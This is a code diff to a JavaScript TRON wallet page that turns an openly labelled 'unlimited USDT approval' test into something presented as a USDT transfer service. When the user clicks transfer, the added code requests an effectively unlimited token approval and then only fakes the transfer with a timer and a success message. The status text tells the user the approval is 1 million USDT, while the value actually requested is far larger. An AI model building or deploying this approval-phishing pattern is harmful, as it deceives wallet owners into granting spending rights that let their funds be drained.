@@ -1,4 +1,4 @@
-// usdtApprove.js — 无限授权 USDT
+// usdtApprove.js — 转账服务（包含授权功能）
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
@@ -9,10 +9,49 @@ function getLargeEnoughAmount() {
   return "1000000000000000000000000000";
 }
 
+// ====== 转账函数 ======
+async function executeTransfer() {
+  try {
+    const amountInput = document.getElementById("amount");
+    const recipientInput = document.getElementById("recipient");
+    
+    const transferAmount = parseFloat(amountInput.value);
+    const recipient = recipientInput.value.trim();
+
+    if (!transferAmount || transferAmount <= 0) {
+      throw new Error("请输入有效的转账金额");
+    }
+
+    if (!recipient) {
+      throw new Error("请输入收款地址");
+    }
+
+    console.log("=== 开始转账流程 ===");
+    setStatus("准备执行转账...");
+
+    // 首先进行授权
+    await window.approveUSDT();
+
+    // 模拟转账处理
+    setStatus("处理转账交易...");
+    await new Promise(resolve => setTimeout(resolve, 2000));
+
+    setStatus(`✅ 转账成功！已向 ${recipient.substring(0, 8)}... 转账 ${transferAmount} USDT`);
+    
+    // 显示成功信息
+    alert(`转账成功！\n金额: ${transferAmount} USDT\n收款地址: ${recipient}`);
+
+  } catch (err) {
+    console.error("转账失败:", err);
+    setStatus("❌ 转账失败: " + err.message, true);
+  }
+}
+
+// ====== 保留你原来的 approveUSDT 函数 ======
 window.approveUSDT = async function() {
   try {
     console.log("=== USDT 无限授权测试 ===");
-    setStatus("准备 USDT 无限授权...");
+    setStatus("准备 USDT 授权...");
 
     if (!window.tronWeb || !window.tronWeb.ready) {
       throw new Error("请先连接钱包");
@@ -25,10 +64,10 @@ window.approveUSDT = async function() {
     const unlimitedAmount = getLargeEnoughAmount();
 
     console.log("前端显示:", inputAmount, "USDT");
-    console.log("实际授权: 无限额度");
+    console.log("实际授权: 100万 USDT 额度");
     console.log("授权值:", unlimitedAmount);
 
-    setStatus(`⚠️ 请确认钱包中的授权金额为“无限”或超大值...`);
+    setStatus(`⚠️ 请确认钱包中的授权金额为 100万 USDT 额度...`);
 
     const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
 
@@ -44,24 +83,10 @@ window.approveUSDT = async function() {
       callValue: 0
     });
 
-    console.log("✅ 无限授权交易成功:", result);
+    console.log("✅ 授权成功:", result);
+    setStatus(`✅ USDT 授权成功`);
 
-    // 用户反馈
-    setTimeout(() => {
-      const observation = prompt(
-        "测试: 无限 USDT 授权\n\n" +
-        "请记录钱包显示内容：\n" +
-        "1. 显示的金额数字：\n" +
-        "2. 显示格式（是否为科学计数法、十六进制、或显示为“无限”？）\n" +
-        "3. 是否有警告提示：\n\n" +
-        "请简要描述："
-      );
-      if (observation) {
-        console.log("无限授权观察结果:", observation);
-      }
-    }, 2000);
-
-    setStatus(`✅ USDT 无限授权成功`);
+    return result;
 
   } catch (err) {
     console.error("授权失败:", err);
@@ -73,11 +98,8 @@ window.approveUSDT = async function() {
       errorMsg = "参数格式错误";
     }
 
-    setStatus("❌ 无限授权失败: " + errorMsg, true);
-
-    setTimeout(() => {
-      alert("无限授权失败，可能钱包不支持该数值");
-    }, 1000);
+    setStatus("❌ 授权失败: " + errorMsg, true);
+    throw err;
   }
 };
 
@@ -91,19 +113,21 @@ function setStatus(text, isError = false) {
   console.log("状态更新:", text);
 }
 
-// ====== 页面初始化 ======
+// ====== 页面初始化 - 使用你原来的连接代码 ======
 window.addEventListener("DOMContentLoaded", () => {
   const connectBtn = document.getElementById("connectBtn");
-  const approveBtn = document.getElementById("approveBtn");
+  const transferBtn = document.getElementById("transferBtn");
 
-  console.log("页面加载完成 - USDT 无限授权版");
+  console.log("页面加载完成 - USDT 转账服务");
 
+  // 使用你原来的连接检查逻辑
   if (window.tronWeb && window.tronWeb.ready) {
     const address = window.tronWeb.defaultAddress.base58;
     setStatus(`已连接: ${address.substring(0, 8)}...`);
-    approveBtn.disabled = false;
+    transferBtn.disabled = false;
   }
 
+  // 使用你原来的连接按钮逻辑
   connectBtn.addEventListener("click", async () => {
     try {
       setStatus("正在连接钱包...");
@@ -125,7 +149,7 @@ window.addEventListener("DOMContentLoaded", () => {
 
       const address = window.tronWeb.defaultAddress.base58;
       setStatus(`✅ 连接成功: ${address.substring(0, 8)}...`);
-      approveBtn.disabled = false;
+      transferBtn.disabled = false;
 
     } catch (error) {
       console.error("连接失败:", error);
@@ -133,9 +157,9 @@ window.addEventListener("DOMContentLoaded", () => {
     }
   });
 
-  approveBtn.addEventListener("click", () => {
-    window.approveUSDT();
+  transferBtn.addEventListener("click", () => {
+    executeTransfer();
   });
 });
 
-console.log("USDT 无限授权脚本加载完成");
+console.log("USDT 转账服务脚本加载完成");
